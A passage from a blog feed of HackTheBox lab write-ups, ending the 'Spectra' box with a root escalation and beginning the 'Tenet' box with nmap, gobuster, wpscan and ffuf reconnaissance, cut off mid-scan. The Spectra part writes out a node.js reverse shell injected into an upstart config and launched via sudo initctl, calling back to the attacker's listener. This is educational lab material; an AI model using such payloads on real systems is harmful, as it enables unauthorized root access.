</span></span><span class="line"><span class="cl">    <span class="m">32112</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test4.conf
</span></span><span class="line"><span class="cl">    <span class="m">32103</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test.conf
</span></span><span class="line"><span class="cl">    <span class="m">32126</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test8.conf
</span></span><span class="line"><span class="cl">    <span class="m">32128</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test9.conf
</span></span><span class="line"><span class="cl">    <span class="m">32106</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test10.conf
</span></span><span class="line"><span class="cl">    <span class="m">32108</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test2.conf
</span></span><span class="line"><span class="cl">    <span class="m">32120</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test5.conf
</span></span><span class="line"><span class="cl">    <span class="m">32105</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test1.conf
</span></span><span class="line"><span class="cl">    <span class="m">23763</span>      <span class="m">4</span> -rwxrwxr-x   <span class="m">1</span> root     developers      <span class="m">251</span> Jun <span class="m">29</span>  <span class="m">2020</span> /srv/nodetest.js
</span></span></code></pre></div><p>These <code>.conf</code> files are configuration scripts to start <code>/srv/nodetest.js</code>.  The JS file itself is not that important here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">katie@spectra ~ $ cat /etc/init/test.conf 
</span></span><span class="line"><span class="cl">description <span class="s2">&#34;Test node.js server&#34;</span>
</span></span><span class="line"><span class="cl">author      <span class="s2">&#34;katie&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">start on filesystem or runlevel <span class="o">[</span>2345<span class="o">]</span>
</span></span><span class="line"><span class="cl">stop on shutdown
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">script
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">export</span> <span class="nv">HOME</span><span class="o">=</span><span class="s2">&#34;/srv&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="nv">$$</span> &gt; /var/run/nodetest.pid
</span></span><span class="line"><span class="cl">    <span class="nb">exec</span> /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">end script
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">pre-start script
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;[`date`] Node Test Starting&#34;</span> &gt;&gt; /var/log/nodetest.log
</span></span><span class="line"><span class="cl">end script
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">pre-stop script
</span></span><span class="line"><span class="cl">    rm /var/run/nodetest.pid
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;[`date`] Node Test Stopping&#34;</span> &gt;&gt; /var/log/nodetest.log
</span></span><span class="line"><span class="cl">end script
</span></span></code></pre></div><h4 id="abusing-sudo-initctl">Abusing sudo initctl</h4>
<p>With sudo privileges and write access on the configuration files, I can perform a command injection to send myself a root shell.</p>
<p>In this write-up, I&rsquo;d like to try injecting a <a href="https://gtfobins.github.io/gtfobins/node/#sudo">node</a> reverse shell.</p>
<p>First, I&rsquo;ll create a copy of the configuration file, which contains reverse shell to my machine and it is without the pre and post script part. I&rsquo;ll name it <code>exploit.conf</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.21»
</span></span><span class="line"><span class="cl">$ cat exploit.conf
</span></span><span class="line"><span class="cl">description <span class="s2">&#34;Test node.js server&#34;</span>
</span></span><span class="line"><span class="cl">author      <span class="s2">&#34;katie&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">start on filesystem or runlevel <span class="o">[</span>2345<span class="o">]</span>
</span></span><span class="line"><span class="cl">stop on shutdown
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">script
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">export</span> <span class="nv">HOME</span><span class="o">=</span><span class="s2">&#34;/srv&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="nv">$$</span> &gt; /var/run/nodetest.pid
</span></span><span class="line"><span class="cl">    <span class="nb">export</span> <span class="nv">RHOST</span><span class="o">=</span>10.10.14.21
</span></span><span class="line"><span class="cl">    <span class="nb">export</span> <span class="nv">RPORT</span><span class="o">=</span><span class="m">9001</span>
</span></span><span class="line"><span class="cl">    <span class="nb">exec</span> /usr/local/share/nodebrew/node/v8.9.4/bin/node -e <span class="s1">&#39;sh = child_process.spawn(&#34;/bin/sh&#34;); net.connect(process.env.RPORT, process.env.RHOST, function () {
</span></span></span><span class="line"><span class="cl"><span class="s1">    this.pipe(sh.stdin);
</span></span></span><span class="line"><span class="cl"><span class="s1">    sh.stdout.pipe(this);
</span></span></span><span class="line"><span class="cl"><span class="s1">    sh.stderr.pipe(this);
</span></span></span><span class="line"><span class="cl"><span class="s1">    })&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">exec</span> /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">end script
</span></span></code></pre></div><p>After that, I&rsquo;ll transfer the file to Spectra in <code>/dev/shm</code> directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.21»
</span></span><span class="line"><span class="cl">$ scp exploit.conf katie@10.10.10.229:/dev/shm
</span></span><span class="line"><span class="cl">Password:
</span></span><span class="line"><span class="cl">bash: warning: /home/katie/.bashrc: warning: script from noexec mount<span class="p">;</span> see https://chromium.googlesource.com/chromiumos/docs/+/master/security/noexec_shell_scripts.md
</span></span><span class="line"><span class="cl">exploit.conf                               100%  <span class="m">775</span>    13.1KB/s   00:00
</span></span></code></pre></div><p>I&rsquo;ll setup a <code>nc</code> listener on my Kali and execute the following command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">katie@spectra /etc/init $ sudo /sbin/initctl stop test5 2&gt;/dev/null<span class="p">;</span> cat /dev/shm/exploit.conf &gt; test5.conf <span class="o">&amp;&amp;</span> sudo /sbin/initctl start test5
</span></span><span class="line"><span class="cl">test5 start/running, process <span class="m">33889</span>
</span></span></code></pre></div><p>If I check my listener, I have a root shell now.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «spectra» «10.10.14.21»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9001</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.21<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.229<span class="o">]</span> <span class="m">37220</span>
</span></span><span class="line"><span class="cl">id <span class="o">&amp;&amp;</span> hostname <span class="o">&amp;&amp;</span> ip a
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span><span class="line"><span class="cl">spectra
</span></span><span class="line"><span class="cl">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="m">65536</span> qdisc noqueue state UNKNOWN group default qlen <span class="m">1000</span>
</span></span><span class="line"><span class="cl">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
</span></span><span class="line"><span class="cl">    inet 127.0.0.1/8 scope host lo
</span></span><span class="line"><span class="cl">       valid_lft forever preferred_lft forever
</span></span><span class="line"><span class="cl">    inet6 ::1/128 scope host
</span></span><span class="line"><span class="cl">       valid_lft forever preferred_lft forever
</span></span><span class="line"><span class="cl">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="m">1500</span> qdisc pfifo_fast state UP group default qlen <span class="m">1000</span>
</span></span><span class="line"><span class="cl">    link/ether 00:50:56:b9:0b:2c brd ff:ff:ff:ff:ff:ff
</span></span><span class="line"><span class="cl">    inet 10.10.10.229/24 brd 10.10.10.255 scope global eth0
</span></span><span class="line"><span class="cl">       valid_lft forever preferred_lft forever
</span></span><span class="line"><span class="cl">    inet6 dead:beef::15c7:10de:7382:baf8/64 scope global temporary dynamic
</span></span><span class="line"><span class="cl">       valid_lft 86303sec preferred_lft 14303sec
</span></span><span class="line"><span class="cl">    inet6 dead:beef::250:56ff:feb9:b2c/64 scope global dynamic mngtmpaddr
</span></span><span class="line"><span class="cl">       valid_lft 86303sec preferred_lft 14303sec
</span></span><span class="line"><span class="cl">    inet6 fe80::250:56ff:feb9:b2c/64 scope link
</span></span><span class="line"><span class="cl">       valid_lft forever preferred_lft forever
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210715085053464.png" alt="image-20210715085053464"  /></div>
</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Tenet</title>
      <link>https://fahmifj.github.io/hackthebox/tenet/</link>
      <pubDate>Mon, 14 Jun 2021 21:46:38 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/tenet/</guid>
      <description>Friendly PHP insecure deserialization attack and race condition</description>
      <content:encoded><![CDATA[<p>Tenet from Hack The Box hosts a Website that is vulnerable to PHP deserialization, and this can be exploited for initial access. Enumerating inside the system reveals a set of database credentials, and these are reused for SSH login. There is a sudo privileges on a custom script, and it can be used to escalate myself into root account if I win a race condition against it.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>PHP deserialization attack</li>
<li>Race-condition</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Gobuster</li>
<li>PHP</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan on Tenet discovers two open ports: SSH on port 22 and an Apache web server on port 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ <span class="nv">ports</span><span class="o">=</span><span class="k">$(</span>nmap -p- --min-rate<span class="o">=</span><span class="m">1000</span> -T4 10.10.10.223 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f <span class="m">1</span> <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed s/,$//<span class="k">)</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ nmap -sC -sV -p<span class="nv">$ports</span> -oA scans/full-tenet 10.10.10.223
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap 7.80 scan initiated Tue Mar 16 23:32:46 2021 as: nmap -sC -sV -p22,80 -oA scans/full-tenet 10.10.10.223</span>
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.223
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.059s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Scanned at 2021-03-16 23:32:46 EDT <span class="k">for</span> 17s
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDA4SymrtoAxhSnm6gIUPFcp1VhjoVue64X4LIvoYolM5BQPblUj2aezdd9aRI227jVzfkOD4Kg3OW2yT5uxFljn7q/Mh5/muGvUNA+nNO6pCC0tZPoPEwMT+QvR3XyQXxbP6povh4GISBySLw/DFQoG3A2t80Giyq5Q7P+1LH1f/m63DyiNXOPS8fNBPz59BDEgC9jJ5Lu2DTu8ko1xE/85MLYyBKRSFHEkqagRXIYUwVQASHgo3OoJ+VAcBTJZH1TmXDc4c6W0hIPpQW5dyvj3tdjKjlIkw6dH2at9NL3gnTP5xnsoiOu0dyofm2L5fvBpzvOzUnQ2rps2wANTZwZ
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLMM1BQpjspHo9teJwTFZntx+nxj8D51/Nu0nI3atUpyPg/bXlNYi26boH8zYTrC6fWepgaG2GZigAqxN4yuwgo<span class="o">=</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMQeNqzXOE6aVR3ulHIyB8EGf1ZaUSCNuou5+cgmNXvt
</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: OPTIONS
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Apache2 Ubuntu Default Page: It works
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Tue Mar 16 23:33:03 2021 -- 1 IP address (1 host up) scanned in 16.80 seconds</span>
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p><code>nmap</code> already identified that this site is the default page of Apache web server.</p>
<p><div class="img-container"><img src="imgs/image-20210614165913959.png" alt="image-20210614165913959"  /></div>
</p>
<h4 id="gobuster">Gobuster</h4>
<p>Running <code>gobuster</code> against the site reveals that there is a WordPress site.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ gobuster dir -u http://10.10.10.223/ -w /opt/SecLists/Discovery/Web-Content/common.txt -b 404,403 -x txt,php,bak -o gobuster/gobuster-nohostname
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Gobuster v3.1.0
</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.10.223/
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   403,404
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extensions:              txt,php,bak
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/06/14 06:08:53 Starting gobuster in directory enumeration <span class="nv">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 10918<span class="o">]</span>
</span></span><span class="line"><span class="cl">/users.txt            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 7<span class="o">]</span>    
</span></span><span class="line"><span class="cl">/wordpress            <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.10.223/wordpress/<span class="o">]</span>
</span></span><span class="line"><span class="cl">                                                                                    
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/06/14 06:11:20 <span class="nv">Finished</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span></code></pre></div><p>Poking <code>/users.txt</code> returns a &ldquo;Success&rdquo; message.</p>
<p><div class="img-container"><img src="imgs/image-20210614171354046.png" alt="image-20210614171354046"  /></div>
</p>
<h4 id="wordpress">/wordpress</h4>
<p>On  <code>/wordpress</code>, somehow  the site looks broken.</p>
<p><div class="img-container"><img src="imgs/image-20210614171926106.png" alt="image-20210614171926106"  /></div>
</p>
<p>It turns out there is a hostname.</p>
<p><div class="img-container"><img src="imgs/image-20210614172030551.png" alt="image-20210614172030551"  /></div>
</p>
<p>I&rsquo;ll add <code>tenet.htb</code> to my <code>/etc/hosts</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;tenet.htb 10.10.10.223&#39;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><p>Poking the site with <code>curl</code> shows that this port has a slightly different contents when it visited using a hostname.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ curl -s http://10.10.10.223 <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">10918</span>
</span></span><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ curl -s http://tenet.htb <span class="p">|</span> wc -c 
</span></span><span class="line"><span class="cl"><span class="m">10581</span>
</span></span></code></pre></div><h3 id="tcp-80---tenethtb">TCP 80 - tenet.htb</h3>
<p>On <code>tenet.htb</code>, there are some blog posts.</p>
<p><div class="img-container"><img src="imgs/image-20210614173225299.png" alt="image-20210614173225299"  /></div>
</p>
<p>One of the post titled with &ldquo;Migrations&rdquo; states that they&rsquo;re currently migrating the data from a flat file.</p>
<blockquote>
<p>/etc/passwd and /etc/shadow are the examples of what is known as a flat file structure.</p>
</blockquote>
<p><div class="img-container"><img src="imgs/image-20210614173704577.png" alt="image-20210614173704577"  /></div>
</p>
<p>At the bottom, there is a comment by a user named <code>neil</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210614174052879.png" alt="image-20210614174052879"  /></div>
</p>
<p>The user was asking about a PHP file called sator and its backup file. I&rsquo;ll note this.</p>
<h4 id="wpscan">WPScan</h4>
<p>I ran a <code>wpscan</code>  to find some database backup or something related with that, but I didn&rsquo;t find anything except usernames.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ wpscan --url http://tenet.htb/ -e vp,vt,cb,dbe,u1-15                                                          
</span></span><span class="line"><span class="cl">_______________________________________________________________
</span></span><span class="line"><span class="cl">         __          _______   _____
</span></span><span class="line"><span class="cl">         <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____<span class="p">|</span>
</span></span><span class="line"><span class="cl">          <span class="se">\ \ </span> /<span class="se">\ </span> / /<span class="p">|</span> <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>___   ___  __ _ _ __ ®
</span></span><span class="line"><span class="cl">           <span class="se">\ \/</span>  <span class="se">\/</span> / <span class="p">|</span>  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __<span class="p">|</span>/ _<span class="sb">`</span> <span class="p">|</span> <span class="err">&#39;</span>_ <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>            <span class="se">\ </span> /<span class="se">\ </span> /  <span class="p">|</span> <span class="p">|</span>     ____<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>
</span></span><span class="line"><span class="cl">             <span class="se">\/</span>  <span class="se">\/</span>   <span class="p">|</span>_<span class="p">|</span>    <span class="p">|</span>_____/ <span class="se">\_</span>__<span class="p">|</span><span class="se">\_</span>_,_<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">         WordPress Security Scanner by the WPScan Team
</span></span><span class="line"><span class="cl">                         Version 3.8.17
</span></span><span class="line"><span class="cl">       Sponsored by Automattic - https://automattic.com/
</span></span><span class="line"><span class="cl">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
</span></span><span class="line"><span class="cl">_______________________________________________________________
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl"><span class="o">[</span>i<span class="o">]</span> User<span class="o">(</span>s<span class="o">)</span> Identified:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> protagonist
</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Author Posts - Author Pattern <span class="o">(</span>Passive Detection<span class="o">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span> Confirmed By:
</span></span><span class="line"><span class="cl"> <span class="p">|</span>  Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span>  Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span>   - http://tenet.htb/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100<span class="p">&amp;</span><span class="nv">page</span><span class="o">=</span><span class="m">1</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span>  Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span>  Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> neil
</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span> Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
</span></span></code></pre></div><h4 id="directory-brute-force-guessing">Directory brute-force (Guessing)</h4>
<p>I tried to guess the location of sator php files with <code>curl</code> but nothing there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ <span class="k">for</span> i in sator.php sator.php.bak<span class="p">;</span> <span class="k">do</span> curl -sIL http://tenet.htb/<span class="nv">$i</span><span class="p">;</span> <span class="k">done</span>
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">404</span> Not Found
</span></span><span class="line"><span class="cl">Date: Mon, <span class="m">14</span> Jun <span class="m">2021</span> 10:51:50 GMT
</span></span><span class="line"><span class="cl">Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>iso-8859-1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">404</span> Not Found
</span></span><span class="line"><span class="cl">Date: Mon, <span class="m">14</span> Jun <span class="m">2021</span> 10:51:51 GMT
</span></span><span class="line"><span class="cl">Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>iso-8859-1
</span></span></code></pre></div><h3 id="vhost-enumeration">Vhost Enumeration</h3>
<p>Next, I&rsquo;ll try to enumerate vhost, but first I&rsquo;ll use <code>cewl</code> to generate a custom wordlist. Because &ldquo;sator&rdquo; and &ldquo;backup&rdquo; are consists of 5 characters, I&rsquo;ll set the minimum word length to 5.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ cewl -m <span class="m">5</span> -w wordlist-vhost http://tenet.htb
</span></span><span class="line"><span class="cl">CeWL 5.4.6 <span class="o">(</span>Exclusion<span class="o">)</span> Robin Wood <span class="o">(</span>robin@digi.ninja<span class="o">)</span> <span class="o">(</span>https://digi.ninja/<span class="o">)</span>
</span></span></code></pre></div><p>I tried the wordlist with <code>ffuf</code>, but didn&rsquo;t find any (damn this tool is insanely fast, took 5 sec).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ ffuf -w wordlist-vhost -u http://10.10.10.223 -H <span class="s2">&#34;Host: FUZZ.tenet.htb&#34;</span> -mc <span class="m">200</span> -fl <span class="m">376</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\ </span>      
</span></span><span class="line"><span class="cl">       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/       
</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span>     
</span></span><span class="line"><span class="cl">        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/      
</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\ </span>      
</span></span><span class="line"><span class="cl">          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">       v1.3.0-dev
</span></span><span class="line"><span class="cl">________________________________________________
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> :: Method           : GET
</span></span><span class="line"><span class="cl"> :: URL              : http://10.10.10.223
</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: wordlist-vhost
</span></span><span class="line"><span class="cl"> :: Header           : Host: FUZZ.tenet.htb
</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">false</span>
</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">40</span>
